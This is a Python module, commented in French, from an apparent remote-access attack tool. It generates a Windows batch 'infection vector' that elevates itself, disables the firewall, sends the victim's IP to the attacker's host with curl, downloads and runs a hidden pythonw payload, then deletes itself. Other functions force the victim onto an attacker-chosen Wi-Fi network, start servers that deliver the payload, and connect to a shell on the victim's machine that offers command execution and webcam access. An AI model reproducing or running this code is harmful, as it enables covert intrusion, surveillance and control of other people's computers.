"""
Author: Wallaby
Created: 2025-02-26
Description: fichier avec toutes les fonctions utiles pour les fichiers qui ne serons pas envoyer.
TODO:
"""

# importation des modules
import socket
import os
from colorama import Fore
try:
    from modules.info import Info
except:
    from info import Info
import csv
import time
import subprocess


def get_self_ip() -> str:
    """
    # get_ip
    ## Presentation
    Fonction pour déterminer l’**adresse IP de la machine**
    ## Fonctionnement
    Via un socket on se connecte a internet `(8.8.8.8)` et on regarde l'adresse de la connection.
    Par default si aucune adresse n'est trouver on affiche un message d'erreur
    et l'adresse hôte retourner est celle du *localhost*
    ## Entrées
    Aucune entrées
    ## Sortie
    * HOST : str, adresse IP de l'hôte
    """
    try:
        s: socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        host: str = s.getsockname()[0]
        s.close()
        Info.valide(f"Adresse IP de l'hôte : {host}")
    except:
        Info.erreur(
            "Vous n'êtes pas connecter a internet\n    -> Attribution de l'adresse IP localhost : 127.0.0.1"
        )
        host: str = "127.0.0.1"
    save_ip(host)
    return host


def menu(help: bool = False) -> None:
    """
    # menu
    ## présentation
    Fonction pour afficher le Menu du début
    ## Entrée
    help => pour afficher l'aide
    ## Sortie
    NONE
    """
    os.system('cls')
    print()
    print(Fore.RED)
    print(
        "███████         ███████ ██ ██████  ███████ ████████ \n   ███          ██      ██ ██   ██ ██         ██    \n  ███           █████   ██ ██████  ███████    ██    \n ███            ██      ██ ██   ██      ██    ██    \n███████ ███████ ██      ██ ██   ██ ███████    ██    \n",
        Fore.WHITE,
    )
    print()
    print(Fore.GREEN, "              coded By Wallaby", Fore.WHITE)
    if help:
        afficher_aide()

def choix()->str:
    """
    Fonction pour faire le choix de la victime
    """
    print(Fore.BLUE, "\nNouvelle cible    [1]")
    print("Ancienne cible    [2]")
    choix = input(">>> ")
    print(Fore.WHITE)
    return choix

def add_same_network_conf(SSID: str, password: str) -> str:
    """
    # add_same_network_conf
    ## Presentation
    Fonction pour ajouter une configuration pour forcer  
    la victime à se connecter à un réseau.
    ## Fonctionnement
    * ouvre le template
    * modifie les paramètres variables
    * renvoie la bonne chaîne à ajouter au payload
    ## Entrées
    * SSID : str, Nom du réseau
    * password : str, Mot de passe du réseau.
    ## Sorties
    Aucunes sorties
    """
    res = f"@echo off\nsetlocal\nset SSID={SSID}\nset PASSWORD={password}\n"
    with open("payload/local_access_point_auto_connect.bat", "r") as f:
        res += f.read()
    return res

def generation_vecteur(host: str, output: str = "payload") -> None:
    """
    # generation_vecteur
    ## Presentation
    Fonction pour générer le vecteur d'infection
    ## Fonctionnement
    * Suppression si il existe du vecteur
    * Création du nouveau fichier
    * Écriture du vecteur
    * Fermeture du fichier
    * Message de validation
    ## Entrées
    * host : str, adresse IP de l'hôte
    * output : str, Nom du fichier
    ## Sorties
    Aucunes sorties
    """
    os.system(f"del {output}.bat")
    fich = open(f"{output}.bat", "w")
    msg = add_same_network_conf(input("SSID of the shared network : "), input("password of the shared network : "))
    msg += f'@echo off\nnet session >nul 2>&1\nif %errorLevel% neq 0 (\npowershell -Command "Start-Process cmd -ArgumentList \'/c \\"%~fnx0\\"\' -Verb RunAs"\nexit /b\n)\nNetSh Advfirewall set allprofiles state off\nfor /f "usebackq tokens=*" %%A in (`powershell -NoProfile -Command "Get-NetIPAddress -InterfaceAlias \'Wi-Fi\' -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress"`) do (\nset "WIFI_IP=%%A"\n)\ncurl -d "%WIFI_IP%" http://{host}:8888/\nset TEMPFILE=%TEMP%\\temp_%RANDOM%.pyw\ncurl -s http://{host}:8000/payload/jeu.pyw -o "%TEMPFILE%"\nstart "" /b pythonw.exe "%TEMPFILE%"\ntimeout /t 2 >nul\ndel "%TEMPFILE%"\ndel "%~f0"\npause'
    fich.write(msg)
    fich.close()
    Info.valide(f"Vecteur crée avec le nom : {output}.bat")
    return None


def save_ip(host) -> None:
    """
    # save_ip
    ## Presentation
    Fonction pour entregistrer l'adresse IP de l'hôte dans un fichier texte
    ## Fonctionnement
    * Ouvre le fichier `selfIp.txt`
    * Remplace le contenue par `host`
    * Ferme le fichier
    ## Entrées
    * host : str, Adresse IP de l'hôte
    ## Sorties
    Aucune sortie
    """
    fich = open("txt_files/selfIp.txt", "w")
    fich.write(host)
    fich.close()


def read_victime_ip() -> str:
    """
    # read_victime_ip
    ## Presentation
    Fonction pour lire l'adresse IP de la victime.
    ## Fonctionnement
    * On supprime le contenue du fichier `message.txt`
    * On attend qu'il y a du contenue dans le fichier `message.txt`
    * On stock le premier élément dans une variable
    * On attend 1s
    * On revérifie la valeur
    * On retourne le premier élément qui est l'adresse IP de la victime
    * On ferme le serveur Node.js qui sert d’écoute pour l'IP
    ## Entrées
    NONE
    ## Sorties
    victime_ip : str, adresse IP de la victime
    """
    first_time = True
    ip_victime = None
    donnees = []
    while first_time:
        first_time = donnees == []
        donnees = []
        while donnees == []:
            fich = open("txt_files/message.txt", "r")
            contenue = csv.reader(fich, delimiter=";")
            donnees = []
            for ligne in contenue:
                donnees.append(ligne)
            fich.close()
        time.sleep(3)
        print(donnees)
    ip_victime: str = donnees[0][0]
    Info.valide(f"IP de la victime trouvé : {ip_victime}")
    time.sleep(5)
    return ip_victime


def create_server():
    """
    # create_server
    ## Présentation
    Fonction pour démarrer les serveur python et node.js
    qui servirons a propager le payload et récupérer
    l'adresse IP de la victime.
    ## Entrée
    NONE
    ## Sortie
    server_js => process associé au serveur Node.js
    server_python => process associé au serveur python
    """
    print("creation des serveurs...", end="\r")
    server_python = subprocess.Popen(
        ["python", "servers/server.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE   #,creationflags=subprocess.CREATE_NEW_CONSOLE
    )

    server_js_path = os.path.abspath("servers/server.js")
    NODE_PATH = r"C:\Program Files\nodejs\node.exe"
    server_js = subprocess.Popen(
        [NODE_PATH, server_js_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    print(" creation des serveurs [OK]")
    return server_js, server_python


def connect_reverse_shell(mySocket, ip_victime: str, port: str) -> int:
    """
    # connect_reverse_shell
    ## Présentation
    Fonction pour se connecter au serveur lancé sur la machine
    de la victime. On fait une boucle infinie sur la connection
    ## Entrée
    mySocket => socket de connection
    ip_victime => adresse ip de la victime
    port => port de connection
    ## Sortie
    NONE
    """
    Info.info(f"Resverse lisening on {ip_victime} port {port}")
    while True:
        try:
            mySocket.connect((ip_victime, port))
            break
        except:
            continue
    Info.valide("Connection [OK]")
    time.sleep(1)
    return 0


def get_msg(mySocket, len_msg: int, verbose: bool = False) -> None:
    """
    # get_msg
    ## Présentation
    Fonction de réception des messages jusqu'à leur fin
    ## Entrée
    mySocket => socket de connection
    len_msg => taille des messages
    verbose => affichage des messages
    # Sortie
    NONE
    """
    msgServeur = ""
    while msgServeur != "ex":
        msgServeur = mySocket.recv(len_msg).decode("Utf8")
        if verbose:
            print(msgServeur)


def new_victime(HOST: str):
    """
    # new_victime
    ## Présentation
    Fonction pour changer de victime
    On récupère son adresse ip et on
    ouvre un serveur fichier pour qu'il
    puisse télécharger le payload
    ## Entrée
    HOST => adresse ip de l'attaquant
    ## Sortie
    NONE
    """
    print("generation du payload...", end="\r")
    generation_vecteur(HOST)
    print("generation du payload [OK]")
    print("payload enregistré sous le nom image.bat")

    fich = open("txt_files/message.txt", "w")
    fich.write("")
    fich.close()
    return 0

def afficher_aide():
    """
    # Afficher_aide
    ## Présentation
    message d'aide a afficher quand on met le titre
    ## Entrée
    NONE
    ## Sortie
    NONE
    """
    print("""
Cette application permet d'exécuter des commandes à distance.
Toutes les commandes Windows sont acceptées et s'exécutent
sur la machine de la cible comme si vous y étiez physiquement.
Utilisez les commandes ci-dessous pour des fonctions spéciales.

╔════════════════════════════════════════════════════════╗
║                 COMMANDES DISPONIBLES                  ║
╠════════════════════════════════════════════════════════╣
║ help           │ Affiche ce message d'aide             ║
║ cam            │ Ouvre la caméra de la victime         ║
║ exit           │ Quitte proprement l'application       ║
║ fin            | éteint le serveur de la victime       ║
╚════════════════════════════════════════════════════════╝
""")

def nettoyage(mySocket):
    """
    # nettoyage
    ## Presentation
    fonction pour supprimer le programme a distance et l’arrêter
    ## Entrée
    mySocket => socket
    ## Sortie
    NONE
    """
    message = "taskkill /im pythonw.exe /F"
    mySocket.send(message.encode("Utf8"))

if __name__=="__main__":
    generation_vecteur("10.10.10.10")
